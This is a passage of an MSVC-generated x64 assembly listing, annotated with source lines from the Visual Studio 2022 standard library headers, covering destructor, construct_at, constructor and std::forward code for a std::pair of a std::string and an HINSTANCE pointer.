; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN38@scalar

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN41@scalar:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN27@scalar:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rbx+16], 0
	mov	rax, rbx

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rbx], 0
	add	rsp, 32					; 00000020H
	pop	rbx
	ret	0
$LN38@scalar:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN52@scalar:
??_G?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAAPEAXI@Z ENDP ; std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$construct_at@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@U?$pair@PEBDPEAUHINSTANCE__@@@2@$0A@@std@@YAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@QEAU10@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@0@@Z
_TEXT	SEGMENT
_Location$ = 48
<_Args_0>$ = 56
??$construct_at@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@U?$pair@PEBDPEAUHINSTANCE__@@@2@$0A@@std@@YAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@QEAU10@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@0@@Z PROC ; std::construct_at<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::pair<char const *,HINSTANCE__ *>,0>, COMDAT

; 374  :     noexcept(::new(static_cast<void*>(_Location)) _Ty(_STD forward<_Types>(_Args)...))) /* strengthened */ {

$LN8:
	mov	QWORD PTR [rsp+8], rbx
	push	rdi
	sub	rsp, 32					; 00000020H
	mov	rbx, rdx
	mov	rdi, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 276  :         : first(_STD forward<_Other1>(_Right.first)), second(_STD forward<_Other2>(_Right.second)) {}

	mov	rdx, QWORD PTR [rdx]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rax, QWORD PTR [rbx+8]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 376  : }

	mov	rbx, QWORD PTR [rsp+48]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 276  :         : first(_STD forward<_Other1>(_Right.first)), second(_STD forward<_Other2>(_Right.second)) {}

	mov	QWORD PTR [rdi+32], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 375  :     _MSVC_CONSTEXPR return ::new (static_cast<void*>(_Location)) _Ty(_STD forward<_Types>(_Args)...);

	mov	rax, rdi

; 376  : }

	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
??$construct_at@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@U?$pair@PEBDPEAUHINSTANCE__@@@2@$0A@@std@@YAPEAU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@0@QEAU10@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@0@@Z ENDP ; std::construct_at<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::pair<char const *,HINSTANCE__ *>,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
;	COMDAT ??$?0PEBDPEAUHINSTANCE__@@$0A@@?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAA@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z
_TEXT	SEGMENT
this$ = 48
_Right$ = 56
??$?0PEBDPEAUHINSTANCE__@@$0A@@?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAA@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z PROC ; std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *><char const *,HINSTANCE__ *,0>, COMDAT

; 276  :         : first(_STD forward<_Other1>(_Right.first)), second(_STD forward<_Other2>(_Right.second)) {}

$LN6:
	mov	QWORD PTR [rsp+8], rbx
	push	rdi
	sub	rsp, 32					; 00000020H
	mov	rbx, rdx
	mov	rdi, rcx
	mov	rdx, QWORD PTR [rdx]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rax, QWORD PTR [rbx+8]
	mov	rbx, QWORD PTR [rsp+48]
	mov	QWORD PTR [rdi+32], rax
	mov	rax, rdi
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
??$?0PEBDPEAUHINSTANCE__@@$0A@@?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@QEAA@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z ENDP ; std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *><char const *,HINSTANCE__ *,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@PEAUHINSTANCE__@@@std@@YA$$QEAPEAUHINSTANCE__@@AEAPEAU1@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@PEAUHINSTANCE__@@@std@@YA$$QEAPEAUHINSTANCE__@@AEAPEAU1@@Z PROC ; std::forward<HINSTANCE__ *>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@PEAUHINSTANCE__@@@std@@YA$$QEAPEAUHINSTANCE__@@AEAPEAU1@@Z ENDP ; std::forward<HINSTANCE__ *>
_TEXT	ENDS
END
